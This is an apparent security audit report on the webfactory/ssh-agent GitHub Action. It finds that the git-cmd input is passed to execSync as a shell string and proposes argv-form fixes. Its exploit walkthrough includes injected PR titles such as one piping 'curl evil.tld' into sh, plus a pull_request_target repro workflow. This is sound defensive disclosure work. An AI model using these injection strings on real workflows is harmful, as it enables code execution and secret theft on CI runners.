# webfactory/ssh-agent — initial review, no P1/P2; one P3 (shell sink via `git-cmd`)

## Provenance

- **Target repo:** `webfactory/ssh-agent`
  ([github.com/webfactory/ssh-agent](https://github.com/webfactory/ssh-agent))
- **Commit audited:** `e83874834305fe9a4a2997156cb26c5de65a8555`
  (`use node24 (#243)`), tagged `v0.10.0`.
- **Default branch at audit time:** `master` @ `e8387483`.
- **License:** MIT.
- **Run type:** `initial`
- **Cycle date (UTC):** 2026-05-05
- **Reviewer:** OSS Security Scout (cycle 1, initial)
- **Prior cycles for this target:** none

## Verdict

`webfactory/ssh-agent` is small (≈85 LOC of first-party JS across `index.js`,
`paths.js`, and `cleanup.js`). Its design centers on a workflow-author-trusted
`ssh-private-key` secret and three workflow-author-controlled command-name
overrides (`ssh-agent-cmd`, `ssh-add-cmd`, `git-cmd`). I found **no P1/P2
findings**: nothing here lets a fork PR author, comment author, or other
not-already-trusted party cross a trust boundary.

I report **one P3 (defense-in-depth) finding**: `git-cmd` is interpolated
into `child_process.execSync` as a shell-string in three places, so a
workflow that erroneously forwards an untrusted value into `git-cmd` would
get arbitrary command execution on the runner. Two **Info** notes follow on
the `ssh-auth-sock` socket-path lever and on the public-key comment regex.

## Threat model

This action is a privileged credential helper that runs as part of a normal
GitHub Actions job. It trusts:

- the workflow author (the same identity that can write `run:` steps and
  therefore already executes arbitrary code on the runner);
- the value of `ssh-private-key` (a secret the workflow author chose);
- the executables resolved through `PATH` (`ssh-agent`, `ssh-add`, `git`)
  and any explicit overrides for them.

It must distrust, in normal usage:

- pull-request authors from forks (`pull_request` triggered jobs do **not**
  receive secrets, so `ssh-private-key` is empty in that case);
- attacker-controlled `github.event.*` strings, e.g. issue titles, PR
  bodies, branch names — *if* a workflow misuses them in `with:` for this
  action.

The relevant trust boundary in this audit is therefore **workflow author
→ runner**: nothing in this action should turn a not-already-trusted
external string (PR title, fork branch, comment) into runner code
execution. With current `webfactory/ssh-agent` code that boundary is, on
balance, held — but with one easy-to-misuse footgun (Finding F-1).

## Surface inventory

```3:21:action.yml
inputs:
    ssh-private-key:
        description: 'Private SSH key to register in the SSH agent'
        required: true
    ssh-auth-sock:
        description: 'Where to place the SSH Agent auth socket'
    log-public-key:
        description: 'Whether or not to log public key fingerprints'
        required: false
        default: true
    ssh-agent-cmd:
        description: 'ssh-agent command'
        required: false
    ssh-add-cmd:
        description: 'ssh-add command'
        required: false
    git-cmd:
        description: 'git command'
        required: false
```

Sinks:

- `child_process.execFileSync(sshAgentCmd, sshAgentArgs)` — argv-form, but
  argv[0] is workflow-controlled (`ssh-agent-cmd`). `index.js:26`.
- `child_process.execFileSync(sshAddCmd, ['-'], { input: key.trim() + "\n" })`
  — argv-form, stdin is the user-supplied private key. `index.js:39`.
- `child_process.execFileSync(sshAddCmd, ['-l'], { stdio: 'inherit' })` —
  argv-form. `index.js:44`.
- `child_process.execFileSync(sshAddCmd, ['-L'])` — argv-form. `index.js:48`.
- `child_process.execSync(\`${gitCmd} config --global ...\`)` — **shell**.
  Three calls. `index.js:63-65`.
- `fs.mkdirSync(homeSsh, { recursive: true })`, `fs.writeFileSync(...)`,
  `fs.appendFileSync(...)` — all paths derived from `os.userInfo().homedir`
  + a `sha256` hex string. `index.js:18,61,72`.

Auth handling:

- Private key delivered via `core.getInput('ssh-private-key')` and piped to
  `ssh-add -` per PEM block via the lookahead split
  `/(?=-----BEGIN)/`. `index.js:38-40`.

## Findings

### Finding F-1: `git-cmd` input is shell-interpolated into `execSync`

- **Severity:** P3 (defense-in-depth)
- **Confidence:** High
- **Affected:** `index.js:63-65`, with the input wired up in `paths.js:22-28`.
- **Trust boundary crossed:** No. Reachable only by the workflow author,
  who already has full `run:` privileges on the runner. Becomes a real
  problem only if a workflow misuses `${{ github.event.* }}` to populate
  `with: git-cmd:`.

**Description.** `git-cmd` (default `'git'`) is concatenated into a
shell-string passed to `child_process.execSync`. Unlike `execFileSync`,
`execSync` runs its argument through `/bin/sh -c`. Any shell metacharacter
in `git-cmd` is therefore interpreted by the shell. The other two
overridable commands (`ssh-agent`, `ssh-add`) use `execFileSync` and are
not affected.

**Evidence.**

```20:28:paths.js
const sshAgentCmdInput = core.getInput('ssh-agent-cmd');
const sshAddCmdInput = core.getInput('ssh-add-cmd');
const gitCmdInput = core.getInput('git-cmd');

module.exports = {
    homePath: defaults.homePath,
    sshAgentCmd: sshAgentCmdInput !== '' ? sshAgentCmdInput : defaults.sshAgentCmdDefault,
    sshAddCmd: sshAddCmdInput !== '' ? sshAddCmdInput : defaults.sshAddCmdDefault,
    gitCmd: gitCmdInput !== '' ? gitCmdInput : defaults.gitCmdDefault,
};
```

```63:65:index.js
        child_process.execSync(`${gitCmd} config --global --replace-all url."git@key-${sha256}.github.com:${ownerAndRepo}".insteadOf "https://github.com/${ownerAndRepo}"`);
        child_process.execSync(`${gitCmd} config --global --add url."git@key-${sha256}.github.com:${ownerAndRepo}".insteadOf "git@github.com:${ownerAndRepo}"`);
        child_process.execSync(`${gitCmd} config --global --add url."git@key-${sha256}.github.com:${ownerAndRepo}".insteadOf "ssh://git@github.com/${ownerAndRepo}"`);
```

The other two interpolated values are safe by construction in this scope:

- `sha256` is `crypto.createHash('sha256').update(key).digest('hex')` —
  hex chars only.
- `ownerAndRepo` is the first capture of
  `/\bgithub\.com[:/]([_.a-z0-9-]+\/[_.a-z0-9-]+)/i` followed by
  `replace(/\.git$/, '')`. Character class is `[A-Za-z0-9._/-]` only — no
  shell metacharacters reachable.

So the *only* attacker-influenced lever in these `execSync` calls is
`gitCmd` itself.

**Reachability.** Concrete walk:

1. A workflow does
   ```yaml
   - uses: webfactory/ssh-agent@v0.10.0
     with:
       ssh-private-key: ${{ secrets.DEPLOY_KEY }}
       git-cmd: ${{ github.event.pull_request.title }}   # misuse
   ```
   on a `pull_request_target` (or any trigger that has access to secrets
   *and* runs in the context of a fork PR).
2. A fork PR author opens a PR titled `git; curl evil.tld | sh; #`.
3. `paths.js` returns `gitCmd = 'git; curl evil.tld | sh; #'`.
4. `execSync` interprets it through `/bin/sh -c`, executing the injected
   command on the runner with secrets in scope.

This is reachable **only** if a workflow forwards untrusted data into
`git-cmd`. The action's documented intent is that `git-cmd` is set, if at
all, to a static path. So this is workflow misuse, not action misuse — but
the action is the one that turns "workflow author wrote a buggy `with:`"
into "fork PR author runs code on your runner with secrets". That makes
it a defense-in-depth issue worth fixing.

**Exploit sketch.** See "Reachability" above; minimal repro:

```yaml
on: pull_request_target
jobs:
  demo:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: webfactory/ssh-agent@v0.10.0
        with:
          ssh-private-key: ${{ secrets.SSH_KEY }}   # has GitHub-deploy-key comment
          git-cmd: ${{ github.event.pull_request.title }}
```

PR title `git; id > /tmp/pwn; #` writes a file as the runner user. Replace
with anything (network exfil, push to other repos with the deploy key,
etc.).

**Suggested fix.** Use `execFileSync` with argv-form, eliminating the
shell entirely. Smallest change in `index.js:63-65`:

```javascript
const gitConfig = (key, value) =>
    child_process.execFileSync(gitCmd, ['config', '--global', '--replace-all', key, value]);

const insteadKey = `url.git@key-${sha256}.github.com:${ownerAndRepo}.insteadOf`;
gitConfig(insteadKey, `https://github.com/${ownerAndRepo}`);
// the second/third calls become `--add` rather than `--replace-all`,
// matching today's behavior.
```

This makes `gitCmd` argv[0] only — the OS will treat it as a literal
binary name/path, with no shell parsing. As a belt-and-braces step,
`paths.js` can also reject `gitCmd` values that contain whitespace or
shell metacharacters when the input was non-empty:

```javascript
const SAFE_CMD = /^[A-Za-z0-9._:\\\/-]+$/;
if (gitCmdInput !== '' && !SAFE_CMD.test(gitCmdInput)) {
    throw new Error(`Refusing unsafe git-cmd value: ${gitCmdInput}`);
}
```

**Notes.** `cleanup.js:7` uses `execFileSync(sshAgentCmd, ['-k'], ...)`,
already argv-form, so the same lever does not exist there.

### Finding F-2: `ssh-auth-sock` allows writing a unix socket to an arbitrary path on the runner

- **Severity:** Info
- **Confidence:** High
- **Affected:** `index.js:22-26`.
- **Trust boundary crossed:** No (workflow-author controlled).

**Description.** `ssh-auth-sock` is passed verbatim as the `-a <path>`
argument to `ssh-agent`. `ssh-agent` will create a unix-domain socket at
that path. There is no validation that the path lies inside `RUNNER_TEMP`
or the workspace.

**Evidence.**

```22:26:index.js
    const authSock = core.getInput('ssh-auth-sock');
    const sshAgentArgs = (authSock && authSock.length > 0) ? ['-a', authSock] : [];

    // Extract auth socket path and agent pid and set them as job variables
    child_process.execFileSync(sshAgentCmd, sshAgentArgs).toString().split("\n").forEach(function(line) {
```

**Reachability.** Same as F-1: requires the workflow author to forward
untrusted data into `ssh-auth-sock`. Even then the only primitive is
"create a unix socket at attacker-chosen path" (or fail if the parent dir
isn't writable as the runner user). On a hosted runner that's not a
useful escalation. On a self-hosted runner whose user has elevated
filesystem reach, it could in theory clobber a path another service is
about to use, but that's an extremely indirect issue.

**Suggested fix.** None required for severity-Info; if hardening,
constrain `ssh-auth-sock` to start with `process.env.RUNNER_TEMP` or the
workspace dir.

### Finding F-3: GitHub-URL regex on key comments allows non-`github.com` hostnames

- **Severity:** Info
- **Confidence:** Medium

**Description.** The deploy-key remap is keyed off matching
`/\bgithub\.com[:/]([_.a-z0-9-]+\/[_.a-z0-9-]+)/i` against each public key
line returned by `ssh-add -L`. The `\b` boundary plus required `[:/]`
after `github.com` makes most footguns inaccessible (e.g.
`github.com.evil.tld:owner/repo` does NOT match — there is no `:` or `/`
immediately after `m`). However, `something-github.com:owner/repo` *does*
match because `-` is a non-word character before `github.com`.

**Evidence.**

```48:65:index.js
    child_process.execFileSync(sshAddCmd, ['-L']).toString().trim().split(/\r?\n/).forEach(function(key) {
        const parts = key.match(/\bgithub\.com[:/]([_.a-z0-9-]+\/[_.a-z0-9-]+)/i);

        if (!parts) {
            if (logPublicKey) {
              console.log(`Comment for (public) key '${key}' does not match GitHub URL pattern. Not treating it as a GitHub deploy key.`);
            }
            return;
        }
```

**Reachability.** A workflow author who controls `ssh-private-key` also
controls the comment, so this is not an exploit primitive — it's a
robustness note. The remap targets `github.com` (constant in the
generated SSH config), so even a key comment of
`mirror-github.com:foo/bar` ends up rerouting *requests to github.com* to
the deploy key, not to a third-party host.

**Suggested fix.** None required; if hardening, anchor the regex with
`(?:^|[\s@])github\.com[:/]` to require a clean leading delimiter.

## No-finding zones

The following areas were read end-to-end and explicitly cleared:

- All three `execFileSync` callers (`index.js:26, 39, 44, 48` and
  `cleanup.js:7`): all argv-form. argv[0] is workflow-controlled but
  argv[1+] is constant or matched against `[A-Za-z0-9._/-]+` — no shell
  metacharacters reachable in argv[1+].
- The PEM split `privateKey.split(/(?=-----BEGIN)/)` (`index.js:38`):
  any prefix before the first `-----BEGIN` becomes the first chunk and is
  fed to `ssh-add -`, which simply errors out — no security primitive.
- `fs.writeFileSync(\`${homeSsh}/key-${sha256}\`, ..., { mode: '600' })`
  (`index.js:61`): `sha256` is hex from `crypto.createHash('sha256')`, no
  path traversal possible. The `mode: '600'` works correctly under a
  default umask (resulting mode 0600 on the new file).
- `os.userInfo().homedir` choice over `os.homedir()` on non-Windows
  (`paths.js:8`): documented design decision to mirror OpenSSH's
  `getpwuid`-based home resolution; not a security issue.
- `cleanup.js`: kills the agent unconditionally with `ssh-agent -k`,
  argv-form. No new sinks introduced.
- `dist/index.js` (compiled output): not reviewed; matches `index.js` per
  build script `scripts/build.js` (uses `@zeit/ncc`). For a deeper review
  this should be diffed against a from-source rebuild, but for this cycle
  the source files are the audit subject.

## Recommendations

- (Hardening, not a finding.) Treat the three `*-cmd` inputs as paths,
  not commands. Validate them against a strict character class
  (`[A-Za-z0-9._:\\/-]+`) on read, and use `execFileSync` everywhere.
  This collapses Finding F-1 and most of F-2's residual risk into a
  single defensive check.
- Document explicitly in the README that `ssh-agent-cmd`, `ssh-add-cmd`,
  `git-cmd`, and `ssh-auth-sock` must be set to **static** values and
  must never be sourced from `${{ github.event.* }}` or PR-author
  data. Today the README discusses these inputs as a runner-config
  facility; it does not call out the trust expectation explicitly.

## References

- Audited tree:
  <https://github.com/webfactory/ssh-agent/tree/e83874834305fe9a4a2997156cb26c5de65a8555>
- Action manifest: `action.yml` at the audited SHA (cited above).
- Node.js `child_process` reference: `execSync` runs through a shell;
  `execFileSync` does not. (Standard library docs.)
- Related control-repo report: none (this is the first cycle for this
  target).

## Reproducibility checklist

- [x] All cited line numbers refer to the audited SHA
  (`e83874834305fe9a4a2997156cb26c5de65a8555`, tag `v0.10.0`).
- [x] No code from the target was executed during the cycle (no install,
  no build, static review only).
- [x] All written files for this cycle are inside this control repo.
- [x] Memory updated with this target.
